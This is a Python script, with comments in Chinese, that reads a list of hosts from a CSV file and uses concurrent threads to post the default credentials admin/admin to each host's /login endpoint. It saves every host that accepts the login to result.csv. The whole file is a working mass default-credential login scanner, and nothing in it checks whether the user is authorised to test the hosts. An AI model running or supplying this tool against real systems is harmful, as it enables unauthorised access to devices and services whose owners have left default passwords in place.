import csv
import requests
from threading import Thread, Lock
import json

# 读取host列表
hosts = []
with open('hosts.csv', 'r') as file:
    reader = csv.reader(file)
    hosts = [row[0] for row in reader]

# 设置结果文件锁
lock = Lock()

# 定义登录测试函数
def test_login(host):
    login_url = f"http://{host}/login"
    payload = "username=admin&password=admin"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "referrer": f"http://{host}/",
        "referrerPolicy": "strict-origin-when-cross-origin"
    }

    try:
        with requests.Session() as session:
            # 发起POST请求
            response = session.post(login_url, headers=headers, data=payload, allow_redirects=False, timeout=10)

            print(f"Testing {host} - Status code: {response.status_code}")
            # 输出响应头用于调试
            print(f"Response headers for {host}: {response.headers}")
            # 输出响应内容用于调试
            print(f"Response content for {host}: {response.text}")

            # 检查响应内容中的"success": true
            if response.status_code == 200:
                response_json = response.json()
                if response_json.get("success") == True:
                    with lock:
                        with open('result.csv', 'a', newline='') as file:
                            writer = csv.writer(file)
                            writer.writerow([host])
                    print(f"Login successful for {host}")
                else:
                    print(f"Login failed for {host} - Success flag not set in response")
            else:
                print(f"Login failed for {host} - Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error testing {host}: {e}")

# 使用多线程进行并发请求
threads = []
for host in hosts:
    thread = Thread(target=test_login, args=(host,))
    threads.append(thread)
    thread.start()

# 等待所有线程完成
for thread in threads:
    thread.join()
